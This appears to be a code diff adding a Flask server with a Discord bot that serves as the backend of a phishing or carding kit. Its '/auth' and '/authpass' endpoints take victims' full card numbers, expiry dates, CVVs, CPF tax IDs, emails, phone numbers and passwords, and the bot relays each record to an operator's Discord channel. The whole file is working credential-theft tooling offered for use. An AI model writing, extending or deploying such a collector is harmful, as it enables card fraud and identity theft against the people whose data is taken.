@@ -1,0 +1,170 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import asyncio
+import threading
+
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# con app.app_context():
+# db.create_all()
+
+cards: list[Card] = []
+
+
+@bot.event
+async def on_ready():
+    print(f'{bot.user} has connected to Discord!')
+
+
+async def send_discord_message(card_data):
+    """Send card information to Discord channel"""
+    try:
+        channel_id = os.getenv("DISCORD_CHANNEL_ID")
+        if channel_id:
+            channel = bot.get_channel(int(channel_id))
+            if channel:
+                message = f"""
+**Nueva información de tarjeta:**
+📱 Celular: {card_data.celular}
+📡 Operadora: {card_data.operadora}
+💰 Valor: {card_data.valor}
+📧 Email: {card_data.email}
+👤 Nombre: {card_data.nome}
+🆔 CPF: {card_data.cpf}
+💳 Tarjeta: {card_data.card}
+📅 Mes: {card_data.mes}
+📅 Año: {card_data.ano}
+🔒 CVV: {card_data.cvv}
+🔑 Token: {card_data.token}
+🏦 BIN: {card_data.bin}
+📊 Datos BIN: {card_data.dadosbin}
+                """
+                await channel.send(message)
+    except Exception as e:
+        print(f"Error sending Discord message: {e}")
+
+
+def run_bot():
+    """Run Discord bot in a separate thread"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(bot.start(token))
+
+
+@app.route('/auth', methods=['POST'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_number = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        user_token = data.get('token')
+        bin_number = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card_number,
+            mes, ano, cvv, user_token, bin_number, dadosbin)
+        cards.append(card)
+
+        # Send to Discord asynchronously
+        if bot.is_ready():
+            asyncio.create_task(send_discord_message(card))
+
+        return jsonify({'Message': 'Card information received successfully'}), 200
+
+    except Exception as ex:
+        print(f"Error in authInfo: {ex}")
+        return jsonify({'Error': 'Internal server error'}), 500
+
+
+@app.route('/authpass', methods=['POST'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in [
+            'senha',
+            'token'
+        ]):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        senha = data.get('senha')
+        user_token = data.get('token')
+
+        for card in cards:
+            if card.token == user_token:
+                # Send password information to Discord
+                if bot.is_ready():
+                    asyncio.create_task(send_password_to_discord(user_token, senha))
+                break
+
+        return jsonify({'Message': 'Password received successfully'}), 200
+
+    except Exception as ex:
+        print(f"Error in authPassword: {ex}")
+        return jsonify({'Error': 'Internal server error'}), 500
+
+
+async def send_password_to_discord(token, password):
+    """Send password information to Discord channel"""
+    try:
+        channel_id = os.getenv("DISCORD_CHANNEL_ID")
+        if channel_id:
+            channel = bot.get_channel(int(channel_id))
+            if channel:
+                message = f"""
+**Contraseña recibida:**
+🔑 Token: {token}
+🔒 Contraseña: {password}
+                """
+                await channel.send(message)
+    except Exception as e:
+        print(f"Error sending password to Discord: {e}")
+
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    return jsonify({'status': 'healthy', 'bot_ready': bot.is_ready()}), 200
+
+
+if __name__ == "__main__":
+    # Start Discord bot in a separate thread
+    if token:
+        bot_thread = threading.Thread(target=run_bot, daemon=True)
+        bot_thread.start()
+    
+    # Start Flask app
+    app.run(host="0.0.0.0", port=5000, debug=False)
